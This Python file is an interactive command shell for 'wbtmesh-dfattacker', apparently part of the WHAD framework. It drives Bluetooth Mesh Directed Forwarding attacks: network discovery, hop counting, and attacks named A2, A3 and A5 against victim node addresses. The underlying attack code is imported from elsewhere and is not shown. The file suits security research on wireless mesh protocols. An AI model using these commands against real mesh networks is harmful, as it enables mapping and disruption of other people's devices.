from whad.cli.shell import category, InteractiveShell
from whad.btmesh.profile import BaseMeshProfile
from whad.btmesh.connectors.df_attack import DFAttacks
from prompt_toolkit import HTML, print_formatted_text
from whad.btmesh.cli.provisionee import BTMeshProvisioneeShell

INTRO = """
wbtmesh-dfattacker, the WHAD Bluetooth Mesh Directed Forwarding Attack tool
"""

SETUP_CAT = "Setup node"
DF_SETUP = "Directed Forwarding Setup"
ELEMENT_CAT = "Element edit"
ATTACK_CAT = "Attacks"
MISC = "Miscellaneous"


def show_fw_table(fw_table):
    """
    Nice display of a FW Table in argument

    Supports non-fixed paths only (for now)

    :param fw_table: FW Table received from Access layer
    :type fw_table: List(ForwardingTableEntry)
    """
    for entry in fw_table:
        header = entry.forwarding_table_entry_header
        if header.fixed_path_flag == 1:
            print_formatted_text(
                HTML(
                    "<ansired>Fixed path flag detected, display not supported</ansired>"
                )
            )
            continue

        if entry.path_origin_unicast_addr_range.length_present:
            po = "[0x%x:0x%x]" % (
                entry.path_origin_unicast_addr_range.range_start,
                entry.path_origin_unicast_addr_range.range_start
                + entry.path_origin_unicast_addr_range.range_length
                - 1,
            )
        else:
            po = "0x%x" % entry.path_origin_unicast_addr_range.range_start

        if header.unicast_destination_flag == 1:
            if entry.path_target_unicast_addr_range.length_present:
                pt = "[0x%x:0x%x]" % (
                    entry.path_target_unicast_addr_range.range_start,
                    entry.path_target_unicast_addr_range.range_start
                    + entry.path_target_unicast_addr_range.range_length
                    - 1,
                )
            else:
                pt = "0x%x" % entry.path_target_unicast_addr_range.range_start

        print_formatted_text(
            HTML("<ansimagenta><b>─ Path %s ─> %s</b></ansimagenta>" % (po, pt))
        )
        print_formatted_text(
            HTML(
                "<ansicyan><i> |─ Forwarding Number : %d</i></ansicyan>"
                % (entry.path_origin_forwarding_number)
            )
        )
        print_formatted_text(
            HTML(
                "<ansicyan><i> |─ Lane Counter : %d</i></ansicyan>"
                % (entry.lane_counter)
            )
        )
        print_formatted_text(
            HTML(
                "<ansicyan><i> |─ Remaining Time : %d</i></ansicyan>"
                % (entry.path_remaining_time)
            )
        )
        if header.dependent_origin_list_size_indicator == 0:
            dep_origin_size = 0
        else:
            dep_origin_size = entry.dependent_origin_list_size

        print_formatted_text(
            HTML(
                "<ansicyan><i> |─ Dependent Origin List Size : %d</i></ansicyan>"
                % (dep_origin_size)
            )
        )

        if header.unicast_destination_flag == 1:
            if header.dependent_target_list_size_indicator == 0:
                dep_target_size = 0
            else:
                dep_target_size = entry.dependent_target_list_size

            print_formatted_text(
                HTML(
                    "<ansicyan><i> |─ Dependent Target List Size : %d</i></ansicyan>"
                    % (dep_target_size)
                )
            )

        if header.backward_path_validated_flag:
            print_formatted_text(HTML("<ansicyan><i> └─ Path is 2-way</i></ansicyan>"))
        else:
            print_formatted_text(HTML("<ansicyan><i> └─ Path is 1-way</i></ansicyan>"))


def show_dependents(dependent_status):
    """
    Nice display of a BTMesh_Model_Directed_Forwarding_Table_Dependents_Get_Status message.

    :param dependent_status: Message received from a distant node when asked for its dependent nodes
    :type dependent_status: BTMesh_Model_Directed_Forwarding_Table_Dependents_Get_Status
    """
    print_formatted_text(
        HTML(
            "<ansimagenta><b>─ Path 0x%x ─> 0x%x</b></ansimagenta>"
            % (dependent_status.path_origin, dependent_status.destination)
        )
    )
    if dependent_status.dependent_origin_unicast_addr_range_list_size == 0:
        print_formatted_text(
            HTML("<ansired><b> |─ No Dependent Origin Addresses</b></ansired>")
        )

    else:
        print_formatted_text(
            HTML("<ansicyan><b> |─ Dependent Origin Addresses : </b></ansicyan>")
        )
        for dep_origin in dependent_status.dependent_origin_unicast_addr_range_list:
            if dep_origin.length_present:
                addr = "[0x%x:0x%x]" % (
                    dep_origin.range_start,
                    dep_origin.range_start + dep_origin.range_length - 1,
                )
            else:
                addr = "0x%x" % dep_origin.range_start

            print_formatted_text(HTML("<ansigreen><i>  |─ %s</i></ansigreen>" % addr))

    if dependent_status.dependent_target_unicast_addr_range_list_size == 0:
        print_formatted_text(
            HTML("<ansired><b> |─ No Dependent Target Addresses</b></ansired>")
        )

    else:
        print_formatted_text(
            HTML("<ansicyan><b> |─ Dependent Target Addresses : </b></ansicyan>")
        )
        for dep_target in dependent_status.dependent_target_unicast_addr_range_list:
            if dep_target.length_present:
                addr = "[0x%x:0x%x]" % (
                    dep_target.range_start,
                    dep_target.range_start + dep_origin.range_length - 1,
                )
            else:
                addr = "0x%x" % dep_target.range_start

            print_formatted_text(HTML("<ansigreen><i>  |─ %s</i></ansigreen>" % addr))


class BTMeshDfAttackerShell(BTMeshProvisioneeShell):
    def __init__(self, interface=None, profile=BaseMeshProfile):
        super().__init__(interface=interface, profile=profile)

        # Since its set in Provisionee init, need to set it after super
        self.update_prompt()

    def update_prompt(self, force=False):
        """Update prompt to reflect current state"""
        # Are we in element edit mode ?
        if self._current_mode == self.MODE_ELEMENT_EDIT:
            self.set_prompt(
                HTML(
                    "<b>wbtmesh-dfattacker | <ansicyan>element(%d)</ansicyan>></b> "
                    % (self._selected_element)
                ),
                force,
            )
        elif self._current_mode == self.MODE_NORMAL:
            self.set_prompt(HTML("<b>wbtmesh-dfattacker></b> "), force)
        elif self._current_mode == self.MODE_STARTED:
            self.set_prompt(
                HTML("<b>wbtmesh-dfattacker<ansimagenta> [running]</ansimagenta>></b> ")
            )

    @category(SETUP_CAT)
    def do_start(self, arg):
        """Start the DFAttacker.
        Recalling it will reset the node.

        <ansicyan><b>start</b> <i>["auto"]</i></ansicyan>

        Starts the provisionee.

        This command can auto the node if specified with :

        > start auto

        If not specified, will send Unprovisioned Device Beacons to be provisioned.
        """

        # Switch to emulation mode
        self._current_mode = self.MODE_STARTED
        self.update_prompt()

        auto_provision = False

        if len(arg) >= 1:
            auto_provision = arg[0].lower() == "auto"

        # Instanciate our Peripheral
        self._connector = DFAttacks(
            self._interface, profile=self._profile, auto_provision=auto_provision
        )
        self._connector.start()

    @category(ATTACK_CAT)
    def do_network_discovery(self, args):
        """Performs discovery of the network (on a network with directed forwarding)

        <ansicyan><b>network_discovery</b> <i>addr_low</i> <i>addr_low</i> [<i>delay</i>]</ansicyan>

        > network_discovery 0001 00AA 4

        The delay value defaults to 3.5 seconds (delay between 2 Path Requests sent)
        """
        if self._current_mode != self.MODE_STARTED:
            self.error(
                "Need to have a provisioned node started to launch the discovery."
            )
            return

        if len(args) < 2:
            self.error("Please provide the range of addresses to discover")
            return

        try:
            addr_low = int(args[0], 16)
            addr_high = int(args[1], 16)
        except ValueError:
            self.error("Please provide the addresses in hex format")
            return

        if addr_low > addr_high:
            self.error("High address should be larger than low address")
            return

        if len(args) >= 3:
            try:
                delay = float(args[2])
            except ValueError:
                self.error("Delay is a float.")
        else:
            delay = 3.5

        self._connector.do_network_discovery(addr_low, addr_high, delay)
        self.success("Successfully started the network_discovery attack.")
        self.success(
            "Wait a little to ask for the topolgy, in about %.1f seconds"
            % ((addr_high - addr_low + 1) * delay)
        )

    @category(ATTACK_CAT)
    def do_get_network(self, arg):
        """Prints the result of the last network discovery (might not be complete if you have not waited enough)

        <ansicyan><b>get_network</b</ansicyan>
        """
        topology = self._connector.get_network_topology()

        for range_start, (range_length, distance) in topology.items():
            print_formatted_text(
                HTML(
                    "|─ <ansimagenta><b>Node 0x%x to 0x%x , %d hops away</b></ansimagenta>"
                    % (range_start, range_start + range_length, distance)
                )
            )

    @category(ATTACK_CAT)
    def do_get_hops(self, arg):
        """Launches the distance discovery attack on discovered nodes

        <ansicyan><b>get_hops</b></ansicyan>
        """

        nb_nodes = len(self._connector.get_network_topology().keys())
        self._connector.do_get_hops()
        self.success(
            "Successfully launched distance evaluation of discovered nodes. Launch 'get_network' to see results in about %.1f seconds."
            % (nb_nodes * 0.5)
        )

    @category(DF_SETUP)
    def do_df_activate(self, arg):
        """Activates DF to all nodes using via a DIRECTED_CONTROL_SET message.

        Activates it for net 0.

        <ansicyan><b>df_activate</b> [<i>DEST</i>]</ansicyan>

        To send the message to 0x05 :

        > df_activate 0x05

        By default, sends it to the broadcast address
        """
        if self._current_mode != self.MODE_STARTED:
            self.error("Need to have a provisioned node started to send this message.")
            return

        if len(arg) > 0:
            try:
                addr = int(arg[0], 16)
            except ValueError:
                self.error("Addr should be in hex format.")
                return
        else:
            addr = 0xFFFF

        self._connector.df_set(addr)
        self.success(
            "Successfully sent the DIRECTED_CONTROL_SET message to 0x%x." % addr
        )

    @category(DF_SETUP)
    def do_2way(self, arg):
        """Sends a BTMesh_Model_Directed_Forwarding_Two_Way_Path_Set to the broadcast address (via MF)

        <ansicyan><b>2way</b> <i>"on"|"off"</i></ansicyan>

        > 2way on
        """

        if len(arg) < 1:
            self.error("Specify on or off.")
            return

        action = arg[0].lower()
        self._connector.do_2way(action == "on")
        self.success(
            "Successfully sent BTMesh_Model_Directed_Forwarding_Two_Way_Path_Set message."
        )

    @category(ATTACK_CAT)
    def do_a5_attack(self, arg):
        """Perform the A5 attack.

        <ansicyan><b>a5_attack</b> <i>VICTIM_ADDR</i></ansicyan>

        > a5_attack 0x000A
        """

        if len(arg) < 1:
            self.error("You need to specify the victim addr (hex format).")
            return

        try:
            victim_addr = int(arg[0], 16)
        except ValueError:
            self.error("You need to use hex format for the victim addr.")
            return

        self.warning("Waiting for the Path Reply from 0x%x ..." % (victim_addr))
        result = self._connector.a5_attack(victim_addr)
        if result:
            self.success(
                "Successfully launched A5 attack on 0x%d. Check table to see if successfull"
                % victim_addr
            )
        else:
            self.error("Attack failed, did not received Reply. Retry.")

    @category(ATTACK_CAT)
    def do_a3_attack(self, args):
        """Perform the A3 attack (based on Path Request Solicitations)

        <ansicyan><b>a3_attack</b> <i>ADDR_1</i> [<i>ADDR_N</i>]</ansicyan>

        > a3_attack 0x0001 0x0003 0x000A

        The addresses listed in argument will be used in the Path Request Solicitations (need 1 minimum)
        For the already in place paths
        """

        if len(args) == 0:
            self.error("You need to specify at least one address for the message.")
            return

        addr_list = []
        for addr in args:
            try:
                addr_list.append(int(addr, 16))
            except ValueError:
                self.error("You need to specify the addresses in hex format")
                return

        self._connector.a3_attack(addr_list)
        self.success("Successfully launched A3 attack on surrounding nodes.")

    @category(ATTACK_CAT)
    def do_a2_attack(self, arg):
        """Activates or deactivtes the A2 attack

        <ansicyan><b>a2_attack</b> <i>"on" | "off"</i></ansicyan>
        """
        if len(arg) < 1:
            self.error("Specify 'on' or 'off' in the argument of the command.")
            return

        action = arg[0].lower()
        if action == "on":
            self._connector.a2_attack(True)
            self.success("Successfully activated A2.")

        elif action == "off":
            self._connector.a2_attack(False)
            self.success("Successfully deactivated A2.")

    @category(DF_SETUP)
    def do_df_table(self, args):
        """Get the Forwarding table entries of the destination Node

        <ansicyan><b>df_table</b> <i>dest</i></ansicyan>
        """

        if len(args) < 1:
            self.error("Specify the destination address")
            return

        try:
            dest = int(args[0], 16)
        except ValueError:
            self.error("You need to specify the addresses in hex format")
            return

        self.warning("Waiting for the response from 0x%x ..." % (dest))
        fw_table = self._connector.df_table(dest)
        if fw_table is None:
            self.error(
                "Did not receive a response for the message, cannot get the DF table of 0x%x"
                % (dest)
            )
            return

        show_fw_table(fw_table)

    @category(DF_SETUP)
    def do_df_dependents(self, args):
        """Get the dependent nodes

        <ansicyan><b>df_dependents</b> <i>dest</i> <i>po</i> <i>pt</i></ansicyan>
        """

        if len(args) < 3:
            self.error("Specify the destination address and the po/pt")
            return

        try:
            dest = int(args[0], 16)
            po = int(args[1], 16)
            pt = int(args[2], 16)
        except ValueError:
            self.error("You need to specify the addresses in hex format")
            return

        dependent_status = self._connector.df_dependents(dest, po, pt)
        if dependent_status is None:
            self.error(
                "Did not receive a response for the message, cannot get the Dependent Nodes of 0x%x for path from 0x%x to 0x%x"
                % (dest, po, pt)
            )
            return

        # If status is not success,error
        if dependent_status.status != 0:
            self.error(
                "The status of the message is not success (%d), cannot get the Dependent Nodes of 0x%x for path from 0x%x to 0x%x"
                % (dependent_status.status, dest, po, pt)
            )
            return

        show_dependents(dependent_status)

    @category(DF_SETUP)
    def do_df_reset(self, arg):
        """Deactivates the DF for the specified destination address (can be broadcast). Deletes all entries at the same time


        <ansicyan><b>df_reset</b> [<i>dest</i>]</ansicyan>

        By default sends to the broadcast addr.
        """

        if len(arg) < 1:
            addr = 0xFFFF
        else:
            try:
                addr = int(arg[0], 16)
            except ValueError:
                self.error("Address must be in hex form.")
                return

        self._connector.df_reset(addr)
        self.success("Successfully reset the DF of specified node(s).")

    @category(SETUP_CAT)
    def do_topology(self, args):
        """Configures the whitelist to correspond to a grid or linear topology (based on unicast addresses)

        <ansicyan>topology <i>"linear"|"grid" [<i>grid_size</i>]</ansicyan>

        To set to topology to grid :

        > topology grid

        For a linear topology :

        > topology linear
        """
        if self._current_mode != self.MODE_STARTED:
            self.error(
                "Need to have a provisioned node/not in element edit to manage whitelist"
            )
            return

        if len(args) < 1:
            self.error("You need to specify the type of topology (grid or linear)")
            return

        topology = args[0].lower()
        own_addr = self._profile.primary_element_addr
        base = "aa:aa:aa:aa:aa:"
        if topology == "linear":
            self._connector.reset_whitelist()
            self._connector.add_whitelist(base + ("%02x" % (own_addr - 1 & 0xFF)))
            self._connector.add_whitelist(base + ("%02x" % (own_addr + 1 & 0xFF)))

            self.success("Successfully set the topology to linear")

        elif topology == "grid":
            if len(args) < 2:
                self.error("Specify Size of grid")
                return

            try:
                grid_size = int(args[1])
            except ValueError:
                self.error("Grid size is an integer decimal form")
                return

            self._connector.reset_whitelist()
            movements = [
                -grid_size - 1,
                -grid_size,
                -grid_size + 1,
                -1,
                +1,
                grid_size - 1,
                grid_size,
                grid_size + 1,
            ]

            for movement in movements:
                addr = own_addr + movement
                if addr > 0 and addr <= grid_size * grid_size:
                    self._connector.add_whitelist(base + ("%02x" % addr))

            self.success("Successfully set the topology to grid")
